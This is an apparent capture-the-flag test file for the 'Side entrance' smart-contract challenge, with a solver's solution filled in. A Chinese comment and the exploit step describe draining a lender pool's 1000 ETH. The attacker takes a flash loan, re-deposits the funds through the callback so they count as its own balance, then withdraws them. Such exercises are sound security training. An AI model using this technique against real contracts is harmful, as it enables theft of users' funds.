const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Side entrance", function () {
  let deployer, attacker;

  const ETHER_IN_POOL = ethers.utils.parseEther("1000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const SideEntranceLenderPoolFactory = await ethers.getContractFactory(
      "SideEntranceLenderPool",
      deployer
    );
    this.pool = await SideEntranceLenderPoolFactory.deploy();

    await this.pool.deposit({ value: ETHER_IN_POOL });

    this.attackerInitialEthBalance = await ethers.provider.getBalance(
      attacker.address
    );

    console.log(this.attackerInitialEthBalance.toString());

    expect(await ethers.provider.getBalance(this.pool.address)).to.equal(
      ETHER_IN_POOL
    );
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    /**
     * solution:
     * 撰寫一個攻擊合約 SideEntranceLenderPoolAttacker 執行 flashLoan 透過 callback execute function 把 pool 裡面全部的錢 deposit 到攻擊合約上，攻擊合約從 pool withdraw 全部 ETH 轉進攻擊合約，攻擊合約再把 ETH 轉給 attacker。
     */
    const SideEntranceLenderPoolAttackerFactory =
      await ethers.getContractFactory(
        "SideEntranceLenderPoolAttacker",
        deployer
      );

    this.sideEntranceLenderPoolAttacker =
      await SideEntranceLenderPoolAttackerFactory.deploy(this.pool.address);

    await this.sideEntranceLenderPoolAttacker
      .connect(attacker)
      .attack(ETHER_IN_POOL);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
      "0"
    );

    // Not checking exactly how much is the final balance of the attacker,
    // because it'll depend on how much gas the attacker spends in the attack
    // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
      this.attackerInitialEthBalance
    );
  });
});
